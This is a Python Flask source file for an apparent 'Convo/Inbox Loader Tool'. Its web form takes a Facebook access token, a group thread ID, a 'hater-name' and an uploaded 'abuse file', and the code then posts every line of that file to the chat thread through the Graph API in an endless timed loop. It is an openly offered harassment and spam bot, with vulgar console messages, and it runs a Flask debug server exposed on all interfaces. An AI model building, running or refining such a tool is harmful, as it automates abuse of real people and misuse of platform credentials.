from flask import Flask, request
import requests
from time import sleep
import time
from datetime import datetime
app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"HA VISHANU SIR APKE TARAH SE MASGE GYA✅ {access_token}: {message}")
                    else:
                        print(f"BHOSDIWALA KA TOKEN FAILED HO GYA😩{access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error while sending message using token {access_token}: {message}")
                print(e)
                time.sleep(30)


    return '''

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>😍💋𝗩𝗜𝗦𝗛𝗔𝗡𝗨 𝗫𝟯 𝗠𝗔𝗬𝗔😍💋</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body{
      background-color: green,yellow;
    }
    .container{
      max-width: 500px;
      background-color: bisque;
      border-radius: 10px;
      padding: 20px;
      box-shadow: 0 0 10px rgba(yellow,red,green,blue,alpha);
      margin: 0 auto;
      margin-top: 20px;
    }
    .header{
      text-align: center;
      padding-bottom: 20px;
    }
    .btn-submit{
      width: 100%;
      margin-top: 10px;
    }
    .footer{
      text-align: center;
      margin-top: 20px;
      color: #888;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mb-3"> 𝐎𝐅𝐅𝐋𝐈𝐍𝐄 𝐒𝐄𝐑𝐕𝐄𝐑 𝐅𝐁 𝐌𝐀𝐒𝐆𝐄𝐑
                        MADE BY 𝗔𝗟𝗟 𝗛𝗔𝗧𝗘𝗥 𝗬𝗢𝗨𝗥 𝗗𝗔𝗗𝗬 𝗩𝗜𝗦𝗛𝗔𝗡𝗨 𝗥𝗔𝗝😈
    𝗢𝗪𝗡𝗘𝗥 𝗩𝗜𝗦𝗛𝗔𝗡𝗨 𝗥𝗔𝗝 >3:)
  </header>

  <div class="container">
    <form action="/" method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="accessToken">𝐄𝐍𝐓𝟑𝐑 𝐘𝐎𝐔𝐑 𝐈𝐃-𝐓𝐎𝐊𝐄𝐍:</label>
        <input type="text" class="form-control" id="accessToken" name="accessToken" required>
      </div>
      <div class="mb-3">
        <label for="threadId">𝐄𝐍𝐓𝟑𝐑 𝐘𝐎𝐔𝐑 𝐆𝐑𝐎𝐔𝐏 𝐔𝐈𝐃:</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx">𝐄𝐍𝐓𝟑𝐑 𝐘𝐎𝐔𝐑 𝐇𝐀𝐓𝐄𝐑-𝐍𝐀𝐌𝐄:</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="txtFile">𝐒𝐄𝐋𝐄𝐂𝐓 𝐍𝐏 𝐀𝐁𝐔𝐒𝐄 𝐅𝐈𝐋𝐄:</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
      </div>
      <div class="mb-3">
        <label for="time">𝐒𝐏𝐄𝐄𝐃 𝐈𝐍 𝐒𝐄𝐂𝐎𝐍𝐃:</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
    </form>
  </div>
  <footer class="footer">
    <p>&copy; Developed by Vi𝐒𝐇aNu 𝐑𝐚𝐉 xD 2024. All Rights Reserved.</p>
    <p>Convo/Inbox Loader Tool</p>
    <p>Keep enjoying  <
  </footer>
</body>
  </html>
    '''


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    app.run(debug=True)
